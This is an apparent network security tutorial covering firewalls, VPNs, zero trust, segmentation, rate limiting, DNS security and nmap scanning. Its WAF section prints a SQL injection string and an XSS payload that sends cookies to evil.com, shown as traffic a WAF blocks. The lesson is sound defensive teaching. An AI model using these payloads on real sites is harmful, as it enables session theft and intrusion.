# Lesson 16: Network Security -- Medieval Castle Defense for the Internet Age

Your application does not exist in isolation. It sits on a network, accessible
from the internet, surrounded by other machines, services, and -- crucially --
attackers. Network security is the discipline of controlling who can talk to
what, how, and under what conditions.

Think of it like medieval castle defense. You have a moat (firewall) to keep
most attackers away. Stone walls (network segmentation) divide your territory
into zones. A drawbridge (VPN) provides controlled entry for authorized people.
Guards at every door (zero trust) verify identity regardless of whether someone
is inside the walls. Archers on the towers (IDS/IPS) watch for suspicious
activity and respond to threats. No single defense is enough -- an attacker who
crosses the moat still faces the walls, the guards, and the archers.

This is defense in depth. Multiple independent layers, each assuming the others
might fail.

---

## Defense in Depth

No single security measure is perfect. Defense in depth means layering multiple
independent controls so that a failure in one layer does not mean total
compromise.

```
Internet
   |
   v
[DDoS Protection / CDN]          Layer 1: Absorb volumetric attacks
   |
   v
[Web Application Firewall]       Layer 2: Block malicious HTTP traffic
   |
   v
[Network Firewall / SG]          Layer 3: Allow only needed ports/protocols
   |
   v
[Load Balancer]                  Layer 4: Terminate TLS, route traffic
   |
   v
[Application Server]             Layer 5: Validate input, authenticate
   |
   v
[Internal Firewall / SG]         Layer 6: Restrict DB access to app servers
   |
   v
[Database Server]                Layer 7: Authorization, encryption at rest
```

Each layer makes an assumption: the layer before it might have failed. The
database should not assume that only authorized traffic reaches it just because
a firewall exists. The application should not assume that input is safe just
because a WAF exists.

---

## Firewalls

A firewall is a gatekeeper. It examines network traffic and decides whether to
allow or block it based on rules. Think of it as the bouncer at a club -- you
have a list of who gets in and who does not.

### iptables / nftables (Linux Host Firewall)

Every Linux machine can act as its own firewall. `iptables` is the traditional
tool; `nftables` is its modern replacement.

```bash
# --- iptables examples ---

# Default policy: drop everything
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established connections (responses to outbound requests)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow loopback (localhost)
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH from a specific IP range
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT

# Allow HTTP and HTTPS from anywhere
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow PostgreSQL only from the application subnet
iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.0/24 -j ACCEPT

# Log dropped packets for debugging
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
```

```bash
# --- nftables equivalent (modern syntax) ---
nft add table inet filter

nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }
nft add chain inet filter forward { type filter hook forward priority 0 \; policy drop \; }
nft add chain inet filter output { type filter hook output priority 0 \; policy accept \; }

nft add rule inet filter input ct state established,related accept
nft add rule inet filter input iif lo accept
nft add rule inet filter input ip saddr 10.0.0.0/8 tcp dport 22 accept
nft add rule inet filter input tcp dport { 80, 443 } accept
nft add rule inet filter input ip saddr 10.0.1.0/24 tcp dport 5432 accept
nft add rule inet filter input log prefix "DROPPED: " drop
```

The key principle: **default deny, explicit allow.** Block everything first,
then open exactly the ports you need to exactly the sources that need them.

### Cloud Security Groups

In AWS, GCP, and Azure, security groups act as virtual firewalls attached to
instances. They are stateful -- if you allow inbound traffic, the response is
automatically allowed outbound.

```
# AWS Security Group: Web Server
Inbound Rules:
  HTTP   (80)    from 0.0.0.0/0         # Anyone can access the website
  HTTPS  (443)   from 0.0.0.0/0         # Anyone can access the website
  SSH    (22)    from 10.0.0.0/8         # SSH only from internal network

Outbound Rules:
  All traffic    to 0.0.0.0/0           # Server can reach anything outbound

# AWS Security Group: Database Server
Inbound Rules:
  PostgreSQL (5432) from sg-webapp       # Only web servers can connect
  SSH        (22)   from sg-bastion      # Only bastion host for admin

Outbound Rules:
  All traffic    to 0.0.0.0/0           # For updates, DNS, etc.
```

Notice the database security group references the web server security group
by ID (`sg-webapp`), not by IP address. This means any instance in the webapp
security group can connect, regardless of its IP. Instances come and go in the
cloud -- tying rules to security group membership is more resilient than tying
them to IP addresses.

### Web Application Firewall (WAF)

A WAF sits in front of your web application and inspects HTTP traffic for
malicious patterns: SQL injection, XSS, path traversal, known exploit payloads.

```
Normal Request:
  GET /api/users?id=42
  -> WAF: looks fine, pass through

Malicious Request:
  GET /api/users?id=42' OR 1=1 --
  -> WAF: SQL injection pattern detected, BLOCK (403 Forbidden)

Malicious Request:
  POST /api/comment
  Body: <script>document.location='http://evil.com/steal?'+document.cookie</script>
  -> WAF: XSS pattern detected, BLOCK
```

A WAF is not a substitute for secure code. It catches common attacks, but
sophisticated attackers craft payloads that bypass WAF rules. Think of it as
a net that catches the easy fish -- you still need to secure the harbor.

---

## VPNs (Virtual Private Networks)

A VPN creates an encrypted tunnel between two points on the internet, making it
appear as if they are on the same private network. Think of it as a secret
underground passage between two castles -- traffic through the tunnel is hidden
from anyone watching the road above.

### How VPNs Work

```
Without VPN:
  Your Laptop  ---[public internet]---  Office Server
  (traffic visible to ISP, WiFi operator, anyone in between)

With VPN:
  Your Laptop  --[encrypted tunnel]--  VPN Server  ---  Office Server
  (ISP sees encrypted blob, cannot read contents)
```

### WireGuard vs OpenVPN

WireGuard is the modern choice. It is simpler, faster, and has a much smaller
codebase (4,000 lines vs OpenVPN's 100,000+). Smaller codebase means smaller
attack surface.

```
Feature          | WireGuard              | OpenVPN
-----------------|------------------------|---------------------------
Codebase         | ~4,000 lines           | ~100,000 lines
Speed            | Near wire speed        | Slower (userspace TLS)
Crypto           | Modern, fixed suite    | Configurable (risk of bad choices)
Protocol         | UDP only               | TCP or UDP
State            | Stateless (no handshake| Connection-oriented
                 | needed to resume)      |
```

### Basic WireGuard Configuration

Server side:

```ini
# /etc/wireguard/wg0.conf (Server)
[Interface]
Address = 10.200.0.1/24
ListenPort = 51820
PrivateKey = SERVER_PRIVATE_KEY

[Peer]
PublicKey = CLIENT_PUBLIC_KEY
AllowedIPs = 10.200.0.2/32
```

Client side:

```ini
# /etc/wireguard/wg0.conf (Client)
[Interface]
Address = 10.200.0.2/24
PrivateKey = CLIENT_PRIVATE_KEY
DNS = 1.1.1.1

[Peer]
PublicKey = SERVER_PUBLIC_KEY
Endpoint = vpn.example.com:51820
AllowedIPs = 10.0.0.0/8
PersistentKeepalive = 25
```

```bash
# Generate key pairs
wg genkey | tee server-private.key | wg pubkey > server-public.key
wg genkey | tee client-private.key | wg pubkey > client-public.key

# Start the tunnel
wg-quick up wg0

# Check status
wg show
```

The `AllowedIPs` field on the client controls which traffic goes through the
tunnel. `10.0.0.0/8` means only traffic destined for internal IPs goes through
the VPN. `0.0.0.0/0` would send ALL traffic through the VPN.

---

## Zero Trust Architecture

Traditional network security follows the "castle and moat" model: once you are
inside the network (past the firewall), you are trusted. Zero trust says: never
trust, always verify. Every request must be authenticated and authorized,
regardless of where it comes from.

Think of it like airport security. Even though you passed through the front door
(lobby), you still have to show your boarding pass and ID at the gate. Even
though you cleared security, the flight crew still verifies your seat assignment.
Being "inside the airport" does not give you unrestricted access.

### The BeyondCorp Model

Google pioneered zero trust with BeyondCorp after a state-sponsored attack
(Operation Aurora, 2009) penetrated their internal network. They realized the
internal network should not be inherently trusted.

```
Traditional Model:
  Internet  ---[Firewall]---  Internal Network (trusted)
                                 |
                                 |-- All services accessible
                                 |-- No authentication between services
                                 |-- Flat network, lateral movement easy

Zero Trust Model:
  Internet  ---  Identity-Aware Proxy  ---  Service A
                                       |--  Service B
                                       |--  Service C
  Each request: verify identity + device health + context
  No difference between "internal" and "external"
```

### Zero Trust Principles

1. **Verify explicitly** -- authenticate and authorize every request
2. **Least privilege** -- give minimum access needed, for the minimum time
3. **Assume breach** -- design as if the attacker is already inside

### Service-to-Service Authentication

In a zero trust architecture, services authenticate to each other using mutual
TLS (mTLS) or signed tokens.

```go
package main

import (
    "crypto/tls"
    "crypto/x509"
    "log"
    "net/http"
    "os"
)

func newMTLSClient(certFile, keyFile, caFile string) (*http.Client, error) {
    cert, err := tls.LoadX509KeyPair(certFile, keyFile)
    if err != nil {
        return nil, err
    }

    caCert, err := os.ReadFile(caFile)
    if err != nil {
        return nil, err
    }

    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(caCert)

    tlsConfig := &tls.Config{
        Certificates: []tls.Certificate{cert},
        RootCAs:      caCertPool,
        MinVersion:   tls.VersionTLS13,
    }

    return &http.Client{
        Transport: &http.Transport{TLSClientConfig: tlsConfig},
    }, nil
}

func main() {
    client, err := newMTLSClient(
        "/etc/certs/client.crt",
        "/etc/certs/client.key",
        "/etc/certs/ca.crt",
    )
    if err != nil {
        log.Fatal(err)
    }

    resp, err := client.Get("https://internal-service.example.com/api/data")
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()

    log.Printf("Response: %d", resp.StatusCode)
}
```

---

## Network Segmentation

Network segmentation divides your network into isolated zones, limiting an
attacker's ability to move laterally. If they compromise one zone, they cannot
automatically reach others.

Think of it like compartments on a submarine. If one compartment floods (is
breached), the watertight doors keep the water from flooding the entire vessel.

### VPC Architecture (Cloud)

```
VPC (10.0.0.0/16)
|
|-- Public Subnet (10.0.1.0/24)
|   |-- Internet Gateway
|   |-- Load Balancer
|   |-- NAT Gateway
|   |-- Bastion Host
|
|-- Private Subnet - App (10.0.2.0/24)
|   |-- Application servers
|   |-- No direct internet access
|   |-- Outbound via NAT Gateway
|
|-- Private Subnet - Data (10.0.3.0/24)
|   |-- Database servers
|   |-- Redis, Elasticsearch
|   |-- No internet access at all
|   |-- Only accessible from App subnet
|
|-- Private Subnet - Management (10.0.4.0/24)
|   |-- Monitoring (Prometheus, Grafana)
|   |-- Logging (ELK stack)
|   |-- Only accessible from Bastion
```

```
Traffic Flow:
  Internet -> Load Balancer (public) -> App Server (private) -> Database (private)
                                                                     ^
                                                                     |
  Attacker compromises app server: can reach database subnet
  Attacker compromises load balancer: CANNOT reach database (wrong subnet)
```

### DMZ (Demilitarized Zone)

A DMZ is a network segment that sits between the public internet and your
private network. It contains services that need to be publicly accessible
(web servers, mail servers) while keeping your internal systems isolated.

```
Internet
   |
   |--- [External Firewall] --- DMZ
   |                             |-- Web Server
   |                             |-- Mail Server
   |                             |-- Reverse Proxy
   |
   |--- [Internal Firewall] --- Internal Network
                                 |-- Application Servers
                                 |-- Database Servers
                                 |-- Employee Workstations
```

Even if an attacker compromises a server in the DMZ, the internal firewall
prevents them from reaching the internal network directly.

---

## DDoS Protection

A Distributed Denial of Service attack floods your system with so much traffic
that legitimate users cannot get through. Think of it like a thousand people
blocking the entrance to a store -- real customers cannot get in.

### Types of DDoS Attacks

```
Volumetric (Layer 3/4):        Flood the network pipe
  UDP flood, ICMP flood        - 100 Gbps+ of garbage traffic
  SYN flood                    - Exhaust connection tables

Protocol (Layer 4):            Exploit protocol behavior
  SYN flood                    - Half-open connections eat memory
  Slowloris                    - Keep connections open forever

Application (Layer 7):         Target the application logic
  HTTP flood                   - Thousands of legitimate-looking requests
  API abuse                    - Hit expensive endpoints repeatedly
```

### Defense: Rate Limiting

```go
package main

import (
    "net/http"
    "sync"
    "time"
)

type RateLimiter struct {
    mu       sync.Mutex
    visitors map[string]*visitor
    rate     int
    window   time.Duration
}

type visitor struct {
    count    int
    lastSeen time.Time
}

func NewRateLimiter(rate int, window time.Duration) *RateLimiter {
    rl := &RateLimiter{
        visitors: make(map[string]*visitor),
        rate:     rate,
        window:   window,
    }
    go rl.cleanup()
    return rl
}

func (rl *RateLimiter) cleanup() {
    for {
        time.Sleep(rl.window)
        rl.mu.Lock()
        for ip, v := range rl.visitors {
            if time.Since(v.lastSeen) > rl.window {
                delete(rl.visitors, ip)
            }
        }
        rl.mu.Unlock()
    }
}

func (rl *RateLimiter) Allow(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    v, exists := rl.visitors[ip]
    if !exists {
        rl.visitors[ip] = &visitor{count: 1, lastSeen: time.Now()}
        return true
    }

    if time.Since(v.lastSeen) > rl.window {
        v.count = 1
        v.lastSeen = time.Now()
        return true
    }

    v.count++
    v.lastSeen = time.Now()
    return v.count <= rl.rate
}

func (rl *RateLimiter) Middleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        ip := r.RemoteAddr
        if !rl.Allow(ip) {
            http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
            return
        }
        next.ServeHTTP(w, r)
    })
}
```

```typescript
import express, { Request, Response, NextFunction } from "express";

interface RateLimitEntry {
  count: number;
  resetAt: number;
}

function rateLimiter(maxRequests: number, windowMs: number) {
  const clients = new Map<string, RateLimitEntry>();

  setInterval(() => {
    const now = Date.now();
    for (const [key, entry] of clients) {
      if (entry.resetAt < now) {
        clients.delete(key);
      }
    }
  }, windowMs);

  return (req: Request, res: Response, next: NextFunction): void => {
    const clientIp = req.ip ?? req.socket.remoteAddress ?? "unknown";
    const now = Date.now();

    const entry = clients.get(clientIp);

    if (!entry || entry.resetAt < now) {
      clients.set(clientIp, { count: 1, resetAt: now + windowMs });
      next();
      return;
    }

    entry.count++;
    if (entry.count > maxRequests) {
      res.status(429).json({ error: "rate limit exceeded" });
      return;
    }

    next();
  };
}

const app = express();
app.use(rateLimiter(100, 60_000));
```

### Defense: CDN Absorption

Put a CDN (Cloudflare, AWS CloudFront, Fastly) in front of your application.
CDNs have massive network capacity and can absorb volumetric attacks that would
overwhelm your servers.

```
Without CDN:
  Attacker (100 Gbps) ---> Your Server (1 Gbps) = dead

With CDN:
  Attacker (100 Gbps) ---> CDN (10+ Tbps capacity) ---> Your Server (1 Gbps)
  CDN absorbs the flood, only legitimate traffic passes through
```

### AWS Shield

AWS Shield Standard (free) protects against common Layer 3/4 DDoS attacks.
AWS Shield Advanced ($3,000/month) provides 24/7 DDoS response team access,
cost protection, and advanced attack mitigation.

**Real-world context:** In February 2020, AWS mitigated a 2.3 Tbps DDoS attack
against one of its customers -- the largest ever recorded at the time. No single
server can withstand that; you need distributed infrastructure to absorb it.

---

## DNS Security

DNS is the phone book of the internet, and it was designed without security in
mind. An attacker who can tamper with DNS responses can redirect your users to
malicious servers.

### DNS Attacks

```
DNS Cache Poisoning:
  Attacker injects fake DNS records into a resolver's cache.
  Users asking "where is bank.com?" get the attacker's IP instead.

DNS Hijacking:
  Attacker compromises the DNS server itself or the domain registrar account.
  All DNS queries return the attacker's answers.

DNS Amplification (DDoS):
  Attacker sends small DNS queries with a spoofed source IP (the victim's IP).
  DNS servers send large responses to the victim.
  Amplification factor: 28-54x.
```

### DNSSEC

DNSSEC adds cryptographic signatures to DNS records. Resolvers can verify that
the response was not tampered with.

```
Without DNSSEC:
  Client: "What's the IP for bank.com?"
  Attacker: "It's 6.6.6.6" (lies)
  Client: "OK, connecting to 6.6.6.6" (attacker's server)

With DNSSEC:
  Client: "What's the IP for bank.com?"
  Attacker: "It's 6.6.6.6" (lies, but no valid signature)
  Resolver: "That response has no valid DNSSEC signature, rejecting"
  Client: Gets the real answer or an error, never the fake one
```

### DNS over HTTPS (DoH) / DNS over TLS (DoT)

Traditional DNS queries are sent in plaintext UDP -- anyone on the network can
see what domains you are looking up. DoH and DoT encrypt DNS queries.

```
Traditional DNS:
  Client --[plaintext UDP]-- DNS Server
  WiFi operator, ISP, anyone on the network can see: "User looked up bank.com"

DNS over HTTPS:
  Client --[HTTPS (encrypted)]-- DNS Server
  Network observers see encrypted traffic to a DNS server, not the queries

DNS over TLS:
  Client --[TLS (encrypted)]-- DNS Server
  Same protection, dedicated port (853)
```

---

## Port Scanning with nmap

To defend a network, you need to know what it looks like to an attacker. `nmap`
is the standard tool for network reconnaissance. Use it on your own
infrastructure to find exposed services before attackers do.

```bash
# Basic scan: which ports are open?
nmap -sT 10.0.1.5

# Service version detection: what software is running on each port?
nmap -sV 10.0.1.5

# Operating system detection
nmap -O 10.0.1.5

# Scan an entire subnet
nmap -sT 10.0.1.0/24

# Aggressive scan: OS detection, version detection, scripts, traceroute
nmap -A 10.0.1.5

# Scan specific ports only
nmap -p 22,80,443,5432,6379 10.0.1.5
```

What you should see on a properly secured web server:

```
PORT    STATE    SERVICE
22/tcp  filtered ssh        # SSH accessible only from VPN
80/tcp  open     http       # Redirects to HTTPS
443/tcp open     https      # The actual service
```

What you should NOT see:

```
PORT      STATE  SERVICE
22/tcp    open   ssh          # SSH open to the internet
5432/tcp  open   postgresql   # Database exposed to the internet
6379/tcp  open   redis        # Redis exposed with no auth
9200/tcp  open   elasticsearch # Elasticsearch exposed
```

**Real-world breach:** In 2017, thousands of MongoDB instances were found
exposed to the internet with no authentication. Attackers deleted the data and
left ransom notes. A simple `nmap` scan would have revealed the exposure before
the attackers found it.

---

## Intrusion Detection and Prevention (IDS/IPS)

IDS monitors network traffic for suspicious activity and alerts you. IPS does
the same but also blocks the traffic automatically. Think of IDS as a security
camera (watch and report) and IPS as a security guard (watch, report, and act).

```
IDS (Detection):
  Traffic -> [Analyze] -> Alert: "Possible SQL injection from 1.2.3.4"
  (traffic still passes through)

IPS (Prevention):
  Traffic -> [Analyze] -> Block: "SQL injection from 1.2.3.4 blocked"
  (traffic dropped)
```

Common IDS/IPS tools:
- **Suricata** -- open source, high performance, supports IDS/IPS modes
- **Snort** -- the original open-source IDS, now owned by Cisco
- **Zeek (Bro)** -- network analysis framework focused on logging

---

## Putting It All Together: Cloud VPC Setup

Here is what a production cloud network architecture looks like, combining all
the concepts:

```
Internet
   |
   v
[CloudFlare / AWS CloudFront]      -- DDoS protection, CDN, WAF
   |
   v
[AWS WAF]                           -- Application-layer filtering
   |
   v
[Application Load Balancer]         -- TLS termination, routing
   |     Public Subnet (10.0.1.0/24)
   v
[NAT Gateway]                       -- Outbound internet for private subnets
   |
   |---- Private Subnet: App (10.0.10.0/24)
   |     [ECS/EKS Tasks]            -- Application containers
   |     Security Group: allow 443 from ALB only
   |
   |---- Private Subnet: Data (10.0.20.0/24)
   |     [RDS PostgreSQL]           -- Database
   |     Security Group: allow 5432 from App SG only
   |     [ElastiCache Redis]        -- Cache
   |     Security Group: allow 6379 from App SG only
   |
   |---- Private Subnet: Mgmt (10.0.30.0/24)
         [Bastion Host]             -- SSH jump box (VPN access only)
         Security Group: allow 22 from VPN SG only
         [Prometheus/Grafana]       -- Monitoring
```

### Terraform Example: Security Group Rules

```hcl
resource "aws_security_group" "alb" {
  name        = "alb-sg"
  description = "ALB security group"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.app.id]
  }
}

resource "aws_security_group" "app" {
  name        = "app-sg"
  description = "Application server security group"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.alb.id]
  }

  egress {
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.database.id]
  }

  egress {
    from_port       = 6379
    to_port         = 6379
    protocol        = "tcp"
    security_groups = [aws_security_group.cache.id]
  }

  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_security_group" "database" {
  name        = "database-sg"
  description = "Database security group"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.app.id]
  }
}

resource "aws_security_group" "cache" {
  name        = "cache-sg"
  description = "Redis cache security group"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port       = 6379
    to_port         = 6379
    protocol        = "tcp"
    security_groups = [aws_security_group.app.id]
  }
}
```

The principle: traffic flows in one direction (internet -> ALB -> app -> database),
each security group only allows the minimum required ports from the minimum
required sources, and nothing is directly accessible from the internet except
the load balancer.

---

## Real-World Breach: Capital One (2019)

An attacker exploited a misconfigured WAF and a Server-Side Request Forgery
(SSRF) vulnerability to access the EC2 instance metadata service. From there,
they obtained IAM role credentials and accessed S3 buckets containing 100
million customer records.

The failures that enabled this:
1. WAF was misconfigured to allow the SSRF
2. The instance role had far too many permissions (violated least privilege)
3. No network segmentation prevented the instance from accessing all S3 buckets
4. No anomaly detection caught the massive data exfiltration

With proper network security: the application would have been in a private
subnet with restricted outbound access, the IAM role would have had minimum
permissions, and network flow logs would have detected the unusual S3 access
patterns.

---

## Hands-On Exercises

1. **nmap your own infrastructure**: Spin up a cloud VM and run `nmap` against
   it. Are there any unexpected open ports? Close them using security groups.

2. **WireGuard setup**: Set up a WireGuard tunnel between two machines (or two
   VMs). Verify that traffic between them is encrypted by running `tcpdump` on
   the network interface.

3. **iptables hardening**: On a Linux machine, configure iptables with a default
   deny policy and explicit allow rules for only the services you need. Test
   that blocked traffic is actually blocked.

4. **VPC from scratch**: Using Terraform or the AWS console, build a VPC with
   public, private-app, and private-data subnets. Verify that a database in the
   data subnet is not reachable from the internet.

5. **Rate limiter**: Extend the rate limiter example to use a sliding window
   algorithm and add per-endpoint rate limits (stricter for login, looser for
   static content).

---

## Key Takeaways

- Defense in depth: never rely on a single security layer. Assume each layer might fail.
- Default deny: block everything, then explicitly allow only what is needed.
- Network segmentation limits blast radius. A compromised web server should not reach your database if it does not need to.
- Zero trust means verifying every request, even from "internal" sources. The network perimeter is not a trust boundary.
- VPNs protect traffic in transit but do not authenticate what happens at either end.
- Know what attackers see: regularly scan your own infrastructure with nmap.
- DDoS protection requires infrastructure-level solutions (CDN, cloud provider shields), not application-level fixes.
- DNS is a critical and often overlooked attack surface. Use DNSSEC and encrypted DNS where possible.
